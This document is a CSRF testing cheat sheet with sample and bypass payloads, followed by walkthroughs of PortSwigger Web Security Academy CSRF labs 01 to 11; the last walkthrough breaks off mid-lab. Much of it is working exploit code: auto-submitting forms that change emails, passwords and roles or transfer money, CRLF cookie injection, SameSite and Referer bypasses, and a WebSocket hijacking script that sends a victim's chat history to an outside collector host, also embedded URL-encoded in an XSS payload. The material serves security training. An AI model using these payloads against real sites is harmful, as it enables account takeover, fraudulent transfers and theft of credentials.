# ✅ **Cross-Site Request Forgery (CSRF) – Complete Test Case (with Bypass Cases)**
---
# **1. List of Vulnerabilities (CSRF Attack Surface)**

* **1.1 Missing CSRF Token Validation**
  No anti-CSRF token → attacker forces authenticated actions.

* **1.2 Predictable / Reusable CSRF Tokens**
  Token not random, or same token reused across sessions.

* **1.3 No SameSite Cookie Protection**
  Cookies automatically sent with cross-site requests.

* **1.4 Token Not Bound to Session/User**
  Token reused by another user.

* **1.5 Token Not Bound to HTTP Method**
  Token works even when method changes from POST → GET.

* **1.6 No Origin/Referer Validation**
  Server does not validate request origin.

* **1.7 CSRF with JSON Endpoints**
  API accepts requests from <script> or forms.

* **1.8 CORS Misconfig + CSRF Combo**
  Exploits both → severe account takeover.

* **1.9 Multi-Step CSRF**
  Multi-page transaction forced automatically.

* **1.10 Clickjacking + CSRF Hybrid Attack**
  User tricked into clicking invisible CSRF-trigger action.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Safe training examples — no harmful execution)

### **2.1 HTML Auto-Submit Form (Classic CSRF PoC)**

```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://victim.com/user/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@mail.com">
</form>
</body>
</html>
```

### **2.2 Image Tag (GET-Based CSRF)**

```html
<img src="https://victim.com/settings/disable-2fa">
```

### **2.3 CSRF for Money Transfer**

```html
<form action="https://victim.com/transfer" method="POST">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

### **2.4 JSON CSRF via POST (simple PoC)**

```html
<form action="https://victim.com/api/profile" method="POST"
      enctype="text/plain">
{"email":"attacker@mail.com"}
</form>
<script>document.forms[0].submit();</script>
```

---

# **3. Bypass Payloads (Advanced Techniques)**

### **3.1 CSRF Token Stripping via Content-Type**

Server accepts:

```
Content-Type: text/plain
```

Bypass token requirement:

```html
<form action="https://victim.com/api/change" enctype="text/plain" method="POST">
{"role":"admin"}
</form>
```

### **3.2 SameSite Cookie Bypass**

If server sets:

```
Set-Cookie: session=abc; SameSite=None; Secure
```

Cookies still sent cross-site → CSRF possible.

### **3.3 JSON CSRF Bypass with Misconfigured Parsers**

```html
<form action="https://victim.com/api/update" enctype="application/json" method="POST">
{"admin":true}
</form>
```

### **3.4 CORS-Assisted CSRF**

If server returns:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://attacker.com
```

Attacker steals API data:

```js
fetch("https://victim.com/account", {credentials:"include"})
```

### **3.5 Flash CSRF (Legacy Bypass)**

If client-side protects only HTML forms:

```html
<object data="csrf.swf"></object>
```

### **3.6 Null-Origin Bypass**

`Origin: null` via sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="
    <form action='https://victim.com/delete' method='POST'></form>
    <script>document.forms[0].submit()</script>
"></iframe>
```

### **3.7 Referer Leak Bypass**

If server checks only Referer domain:

```
https://victim.com.evil.net/update
```

→ bypasses regex.

### **3.8 Preflight Bypass via GET → POST Confusion**

If API incorrectly allows:

```
GET /delete-account
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Change Password CSRF**

```html
<form action="https://victim.com/password/change" method="POST">
  <input type="hidden" name="newPassword" value="Attacker123">
</form>
```

### **4.2 Disable 2FA**

```html
<img src="https://victim.com/user/2fa/disable">
```

### **4.3 Admin Privilege Escalation**

```html
<form action="https://victim.com/admin/update-role" method="POST">
  <input type="hidden" name="role" value="admin">
  <input type="hidden" name="user" value="attacker">
</form>
```

### **4.4 OAuth/SSO CSRF (Force Login)**

```html
<img src="https://victim.com/oauth/authorize?client_id=attacker&response_type=token">
```

### **4.5 CSRF with Multi-Step Transaction**

```html
<iframe src="https://victim.com/step1?amount=5000"></iframe>
<iframe src="https://victim.com/step2"></iframe>
<iframe src="https://victim.com/confirm"></iframe>
```

### **4.6 REST API CSRF**

```html
<form action="https://victim.com/api/user" enctype="application/x-www-form-urlencoded">
  username=hacked&role=admin
</form>
```

---

# **5. Validation / Test Steps**

**Step 1:** Identify state-changing endpoints
→ profile updates, finance actions, admin functions.

**Step 2:** Check if tokens exist

* hidden inputs
* headers
* double submit cookies

**Step 3:** Verify token tied to session/user
→ must be unique per session.

**Step 4:** Try basic CSRF PoC
→ auto-submitting form.

**Step 5:** Try JSON endpoints
→ test `text/plain`, `application/json`, etc.

**Step 6:** Test Origin and Referer validation
→ send custom header values.

**Step 7:** Try advanced bypasses
→ Null-Origin, SameSite=None, CORS combo.

---

# **6. Expected Results / Impact**

* Profile modifications.
* Email/Password change → account takeover.
* Funds transfer without consent.
* Admin privilege escalation.
* OAuth token hijack or unauthorized login.
* Disabling MFA / security settings.

CSRF can lead to **complete account takeover** and financial loss.

---

# 01 CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf

---------------------------------------------

There is a function to update the user's email:



![img](images/CSRF%20vulnerability%20with%20no%20defenses/1.png)

It is a POST request. Clicking "Engagement tools" > "Generate CSRF PoC", it generates an HTML PoC.



![img](images/CSRF%20vulnerability%20with%20no%20defenses/2.png)


```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac5004c04ed095e819302fc004d00f6.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# 02 CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

Generated link: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/




![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/1.png)



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/2.png)

It is a POST request:



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/3.png)

Change the method to GET:

/my-account/change-email?email=test3%40test.com




![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/4.png)

You get a redirection code, if you follow it the email is updated:



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/5.png)



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/6.png)


Payload:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/7.png)

# 03 CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation



![img](images/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/1.png)

---------------------------------------------

In this case the default POST request to change the email contains a parameter “csrf”, but it works if you send only the email and no CSRF token:



![img](images/CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present/1.png)


Clicking "Engagement tools" > "Generate CSRF PoC", it generates an HTML PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a27008804d6685d8057df8500ab003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# 04 CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation

![img](images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/1.png)

---------------------------------------------


In this case the default POST request to change the email contains a parameter “csrf”. I intercepted and dropped the request sp the CSRF token is not used, but before that I created the CSRF PoC:

![img](images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/2.png)


Clicking "Engagement tools" > "Generate CSRF PoC", it generates an HTML PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8d002b036bf12e80d4301200d80079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test9&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="FbQyYrVpBEJETLtQVqXtlLRi69gJg3WR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# 05 CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation

- https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript

- https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies

- https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/1.png)

---------------------------------------------

First we change the email to test@test.com and find there are 2 cookies, one is “session” and the other is “csrfKey”:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/2.png)


Then I found some code to set the value of a cookie (https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript):

```
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

setCookie('ppkcookie','testcookie',7);
```

In our case we would change the last line to:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  
		<script>
		function setCookie(name,value,days) {
			var expires = "";
			if (days) {
				var date = new Date();
				date.setTime(date.getTime() + (days*24*60*60*1000));
				expires = "; expires=" + date.toUTCString();
			}
			document.cookie = name + "=" + (value || "")  + expires + "; path=/";
		}

		setCookie('csrfKey','Eb67I1HyfMZGN1o9KZWih0EwODxdozMg',7);
		</script>
	
	    <form action="https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

However this will not work because we need to set the Cookie header, not the cookies in the browser. We can use XHR (https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies). Then I will create a POST request in Javascript with XHR (https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest):

```
<script>

var xhr = new XMLHttpRequest();
var url = "https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net";
xhr.open('POST', url+'/my-account/change-email', true);

xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Cookie', 'TESTING');
xhr.setRequestHeader('Cookie', 'csrfKey=Eb67I1HyfMZGN1o9KZWih0EwODxdozMg');

xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
};
xhr.send('email=test12&#64;test&#46;com&csrf=V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl');

</script>
```

But this does not work either.


Checking the application again, we find the search function adds a value in the Cookie HTTP header:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/3.png)


It is added as LastSearchTerm:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/4.png)


Following the official solution, it is necessary to use this payload:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- 0x0A is the newline character \n
- 0x0D is the return character \r
- Set-Cookie will change the value for the Cookie HTTP Header 


The img element will load the malicious URL and the submit the form generated by Burp:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
	  <form action="https://0a3a0029035a2e108071588100890067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="l0RRXoovjgxMasM34eeADEMkc24whrt3" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3a0029035a2e108071588100890067.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=tCFA5gCGZOqAwxhYizupPrZqP7jvVE8L%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/5.png)

# 06 CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/1.png)

---------------------------------------------

We find the CSRF token value in the POST parameter and the Cookie HTTP header, with the same value:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/2.png)

Using a random value, it still works:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/3.png)


The search function uses again the LastSearchTerm parameter with the last searched term:



![img](images/CSRF%20where%20token%20is%20duplicated%20in%20cookie/4.png)


We will update the PoC from the previous lab:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
      <form action="https://0a3400fa040b0564802fee0a002000c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="TESTING123" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3400fa040b0564802fee0a002000c9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=TESTING123%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```

# 07 SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Note: The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions




![img](images/SameSite%20Lax%20bypass%20via%20method%20override/1.png)

---------------------------------------------

Chrome sets Lax restriction by default so we must try to execute a GET request that will change the user's email. By default it is a POST request:



![img](images/SameSite%20Lax%20bypass%20via%20method%20override/2.png)


If we change the method to GET and add “\_method” parameter it still works:


![img](images/SameSite%20Lax%20bypass%20via%20method%20override/3.png)

Then we will use this payload:

```
<script>
    document.location = 'https://0a6d00f7038377ec8069495800fd0010.web-security-academy.net/my-account/change-email?email=test4%40test.com&_method=POST';
</script>
```

# 08 SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.


---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/1.png)

---------------------------------------------

There is a POST request to update the email:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/2.png)

It is possible to change the method to GET and it still works:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/3.png)


After sending a comment to a blog post there is a redirection to /post:





![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/5.png)


We find there is a Javascript script generating this redirect in “/resources/js/commentConfirmationRedirect.js”:

```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/6.png)


This is controlled by requests to “/post/comment/confirmation?postId=a”. We should change the “postId” parameter so it redirects to something like:

```
/post/../my-account/change-email?email=test5%40test.com&submit=1
```

So we can try something like this:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com&submit=1
```

It redirects correctly but the parameter “submit” is not sent:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/7.png)


So we can try changing “&” with “%26”, the URL-encoded version:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com%26submit=1
```

This time it works:



![img](images/SameSite%20Strict%20bypass%20via%20client-side%20redirect/8.png)


Payload:

```
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```

# 09 SameSite Strict bypass via sibling domain

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.

Hint: Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/1.png)

---------------------------------------------

From the already completed “Cross-site WebSocket hijacking” lab in the WebSockets section we have the payload:

```
<script>
    var ws = new WebSocket('wss://0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://if1w7siga1cezj30b8k08i20erki8bw0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```


There is a connection:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/2.png)


We can read the Javascript code to write comments to the chat in /resources/js/chat.js:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/3.png)

And that the characters encoded when sending a message are: 

``` 
' " < > & \r \n \\
```





![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/5.png)


```
(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = new WebSocket(chatForm.getAttribute("action"));

    webSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record")
        webSocket.send("READY")
    }

    webSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
            writeMessage("typing", "", "[typing...]")
        } else {
            var messageJson = JSON.parse(message);
            if (messageJson && messageJson['user'] !== "CONNECTED") {
                Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                    element.parentNode.removeChild(element);
                });
            }
            Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                element.parentNode.removeChild(element);
            });

            if (messageJson['user'] && messageJson['content']) {
                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
            }
        }
    };

    webSocket.onclose = function (evt) {
        writeMessage("message", "DISCONNECTED:", "-- Chat has ended --")
    };

    chatForm.addEventListener("submit", function (e) {
        sendMessage(new FormData(this));
        this.reset();
        e.preventDefault();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        webSocket.send(JSON.stringify(object));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }
})();
```


When retrieving this file we find a subdomain “cms” in the HTTP header “Access-Control-Allow-Origin” in the response:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/6.png)


There is a login function in the subdomain. It reflects the username we send:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/7.png)


Using the XSS payload in the username field we get a XSS:

```
<script>alert(1)</script>
```



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/8.png)


This is a POST request but can be changed to GET:



![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/9.png)


"As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions"

```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=aa&password=aa";
</script>
```


URL-encode the “Cross-site WebSocket hijacking” payload:

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```


Use it as the payload in the username field:


```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aa";
</script>
```




![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/10.png)


Login with credentials carlos:565vmsewc7e8c05o7jf4

# 10 SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

Note: The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

Browsers block popups from being opened unless they are triggered by a manual user interaction, such as a click. The victim user will click on any page you send them to, so you can create popups using a global event handler as follows:

```
<script>
    window.onclick = () => {
        window.open('about:blank')
    }
</script>
```

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions




![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/1.png)

---------------------------------------------

There is an update email function:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/2.png)


It is a POST request:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/3.png)


It is not possible to change the method to GET:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/4.png)


When logging in we get redirected to the subdomain "oauth":



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/5.png)


This is generated with an url like:

```
https://oauth-0a6f009504061a2780d1702b026c00f7.oauth-server.net/auth?client_id=erw3xdeohdsu1g89oaqu0&redirect_uri=https://0a72005004831ac38087729700fb0018.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

This request needs some parameters like client_id or it will fail:



![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/6.png)


From the Portswigger we know that “completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site”, so we must find a way to call this Oauth service, even when we dont know the client id value of the victim user.

Inspecting the requests, it is possible to generate a new session accessing "/social-login" when already logged:





![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/7.png)
![img](images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/8.png)


Take the PoC generated by Burp for the POST request to update the email address and add the code so it executes when the victim clicks, so it open /social-login, wait 10 seconds and then submit the form:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a72005004831ac38087729700fb0018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test77&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
	    window.onclick = () => {
	        window.open('https://0a72005004831ac38087729700fb0018.web-security-academy.net/social-login');
            setTimeout(submit, 10000);
			function submit(){			
				history.pushState('', '', '/');
		  		document.forms[0].submit();    	
      		}
	    }      
    </script>
  </body>
</html>
```

# 11 CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/1.png)

---------------------------------------------

There is a function to update the email:



![img](images/CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present/2.png)


It is a POST request with the “Referer” HTTP header:



